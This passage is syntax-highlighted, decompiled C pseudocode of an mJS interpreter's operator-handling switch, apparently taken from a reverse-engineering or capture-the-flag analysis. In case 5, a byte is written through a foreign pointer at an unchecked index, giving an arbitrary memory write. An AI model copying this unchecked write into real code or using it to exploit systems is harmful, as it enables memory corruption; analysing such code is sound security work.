</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> val_0; <span style="color:#75715e">// [rsp+1A0h] [rbp-A0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> a_7; <span style="color:#75715e">// [rsp+1A8h] [rbp-98h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> b_5; <span style="color:#75715e">// [rsp+1B0h] [rbp-90h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> a_6; <span style="color:#75715e">// [rsp+1B8h] [rbp-88h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> b_4; <span style="color:#75715e">// [rsp+1C0h] [rbp-80h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> a_5; <span style="color:#75715e">// [rsp+1C8h] [rbp-78h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> b_3; <span style="color:#75715e">// [rsp+1D0h] [rbp-70h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> a_4; <span style="color:#75715e">// [rsp+1D8h] [rbp-68h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> b_2; <span style="color:#75715e">// [rsp+1E0h] [rbp-60h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> b_1; <span style="color:#75715e">// [rsp+1E8h] [rbp-58h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> a_3; <span style="color:#75715e">// [rsp+1F0h] [rbp-50h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> b_0; <span style="color:#75715e">// [rsp+1F8h] [rbp-48h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> a_2; <span style="color:#75715e">// [rsp+200h] [rbp-40h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> a_1; <span style="color:#75715e">// [rsp+208h] [rbp-38h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> val; <span style="color:#75715e">// [rsp+210h] [rbp-30h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> a_0; <span style="color:#75715e">// [rsp+218h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> a; <span style="color:#75715e">// [rsp+220h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> b; <span style="color:#75715e">// [rsp+228h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> ( op )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">20</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">50</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      val_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);                     <span style="color:#75715e">// function PTR  -foreign
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      obj <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);                       <span style="color:#75715e">// scope? 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      key <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);                       <span style="color:#75715e">// key name str
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_object</span>(obj) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_set_v</span>(mjs, obj, key, val_0);        <span style="color:#75715e">// set foreign ptr RAW
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_foreign</span>(obj) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        ikey <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_int</span>(mjs, key);
</span></span><span style="display:flex;"><span>        ival <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_int</span>(mjs, val_0);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mjs_is_number</span>(key) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_prepend_errorf</span>(mjs, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;index must be a number&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_push</span>(mjs, <span style="color:#ae81ff">0xFFF3000000000000LL</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_number</span>(val_0) <span style="color:#f92672">&amp;&amp;</span> ival <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x100</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)<span style="color:#a6e22e">mjs_get_ptr</span>(mjs, obj) <span style="color:#f92672">+</span> ikey) <span style="color:#f92672">=</span> ival;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_prepend_errorf</span>(mjs, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;only number 0 .. 255 can be assigned&#34;</span>);
</span></span><span style="display:flex;"><span>          val_0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFF3000000000000LL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_prepend_errorf</span>(mjs, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;unsupported object type&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, val_0);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">13</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">14</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">15</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">16</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">17</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">18</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">19</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">26</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">27</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">48</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      b <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      a <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      v2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">do_op</span>(mjs, a, b, op);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v2);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">22</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      val <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      is_truthy <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_is_truthy</span>(mjs, val);
</span></span><span style="display:flex;"><span>      v6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_boolean</span>(mjs, is_truthy <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v6);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">23</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      v7 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      a_1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_double</span>(mjs, v7);
</span></span><span style="display:flex;"><span>      v8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_number</span>(mjs, (<span style="color:#66d9ef">double</span>)<span style="color:#f92672">~</span>(<span style="color:#66d9ef">int</span>)a_1);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v8);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">24</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      v13 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      b_2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_double</span>(mjs, v13);
</span></span><span style="display:flex;"><span>      v14 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      a_4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_double</span>(mjs, v14);
</span></span><span style="display:flex;"><span>      v15 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_boolean</span>(mjs, b_2 <span style="color:#f92672">&gt;</span> a_4);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v15);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">25</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      v16 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      b_3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_double</span>(mjs, v16);
</span></span><span style="display:flex;"><span>      v17 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      a_5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_double</span>(mjs, v17);
</span></span><span style="display:flex;"><span>      v18 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_boolean</span>(mjs, a_5 <span style="color:#f92672">&gt;</span> b_3);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v18);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">28</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      obj_2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      key_2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mjs_is_object</span>(obj_2) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">mjs_is_string</span>(key_2) )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_32;
</span></span><span style="display:flex;"><span>      v <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_v</span>(mjs, obj_2, key_2);
</span></span><span style="display:flex;"><span>      v27 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_number</span>(mjs, <span style="color:#ae81ff">1.0</span>);
</span></span><span style="display:flex;"><span>      v_1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">do_op</span>(mjs, v, v27, <span style="color:#ae81ff">14</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_set_v</span>(mjs, obj_2, key_2, v_1);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v_1);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">29</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      obj_3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      key_3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mjs_is_object</span>(obj_3) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">mjs_is_string</span>(key_3) )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_28;
</span></span><span style="display:flex;"><span>      v32 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_v</span>(mjs, obj_3, key_3);
</span></span><span style="display:flex;"><span>      v28 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_number</span>(mjs, <span style="color:#ae81ff">1.0</span>);
</span></span><span style="display:flex;"><span>      v_2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">do_op</span>(mjs, v32, v28, <span style="color:#ae81ff">13</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_set_v</span>(mjs, obj_3, key_3, v_2);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v_2);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">30</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">op_assign</span>(mjs, <span style="color:#ae81ff">13</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">31</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">op_assign</span>(mjs, <span style="color:#ae81ff">14</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">32</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">op_assign</span>(mjs, <span style="color:#ae81ff">12</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">33</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">op_assign</span>(mjs, <span style="color:#ae81ff">15</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">34</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">op_assign</span>(mjs, <span style="color:#ae81ff">17</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">35</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">op_assign</span>(mjs, <span style="color:#ae81ff">18</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">36</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">op_assign</span>(mjs, <span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">37</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">op_assign</span>(mjs, <span style="color:#ae81ff">19</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">38</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_set_errorf</span>(mjs, MJS_NOT_IMPLEMENTED_ERROR, <span style="color:#e6db74">&#34;Use ===, not ==&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">39</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_set_errorf</span>(mjs, MJS_NOT_IMPLEMENTED_ERROR, <span style="color:#e6db74">&#34;Use !==, not !=&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">40</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      v19 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      b_4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_double</span>(mjs, v19);
</span></span><span style="display:flex;"><span>      v20 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      a_6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_double</span>(mjs, v20);
</span></span><span style="display:flex;"><span>      v21 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_boolean</span>(mjs, b_4 <span style="color:#f92672">&gt;=</span> a_6);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v21);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      v22 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      b_5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_double</span>(mjs, v22);
</span></span><span style="display:flex;"><span>      v23 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      a_7 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_double</span>(mjs, v23);
</span></span><span style="display:flex;"><span>      v24 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_boolean</span>(mjs, a_7 <span style="color:#f92672">&gt;=</span> b_5);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v24);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">44</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      a_2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      b_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      v9 <span style="color:#f92672">=</span> <span style="color:#a6e22e">check_equal</span>(mjs, a_2, b_0);
</span></span><span style="display:flex;"><span>      v10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_boolean</span>(mjs, v9);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v10);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">45</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      a_3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      b_1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      v11 <span style="color:#f92672">=</span> <span style="color:#a6e22e">check_equal</span>(mjs, a_3, b_1);
</span></span><span style="display:flex;"><span>      v12 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_boolean</span>(mjs, v11 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v12);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">46</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">op_assign</span>(mjs, <span style="color:#ae81ff">26</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">47</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">op_assign</span>(mjs, <span style="color:#ae81ff">27</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">49</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">op_assign</span>(mjs, <span style="color:#ae81ff">48</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">51</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      a_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_double</span>(mjs, v3);
</span></span><span style="display:flex;"><span>      v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_number</span>(mjs, <span style="color:#a6e22e">COERCE_DOUBLE</span>(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>a_0 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x8000000000000000LL</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v4);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">52</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      obj_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      key_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_object</span>(obj_0) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">mjs_is_string</span>(key_0) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        v35 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_v</span>(mjs, obj_0, key_0);
</span></span><span style="display:flex;"><span>        v25 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_number</span>(mjs, <span style="color:#ae81ff">1.0</span>);
</span></span><span style="display:flex;"><span>        v1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">do_op</span>(mjs, v35, v25, <span style="color:#ae81ff">13</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_set_v</span>(mjs, obj_0, key_0, v1);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(mjs, v35);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>LABEL_28:
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_set_errorf</span>(mjs, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;invalid operand for ++&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">53</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      obj_1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      key_1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_object</span>(obj_1) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">mjs_is_string</span>(key_1) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        v34 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_v</span>(mjs, obj_1, key_1);
</span></span><span style="display:flex;"><span>        v26 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_number</span>(mjs, <span style="color:#ae81ff">1.0</span>);
</span></span><span style="display:flex;"><span>        v1_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">do_op</span>(mjs, v34, v26, <span style="color:#ae81ff">14</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_set_v</span>(mjs, obj_1, key_1, v1_0);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(mjs, v34);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>LABEL_32:
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_set_errorf</span>(mjs, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;invalid operand for --&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">227</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      v29 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);
</span></span><span style="display:flex;"><span>      v30 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_typeof</span>(v29);
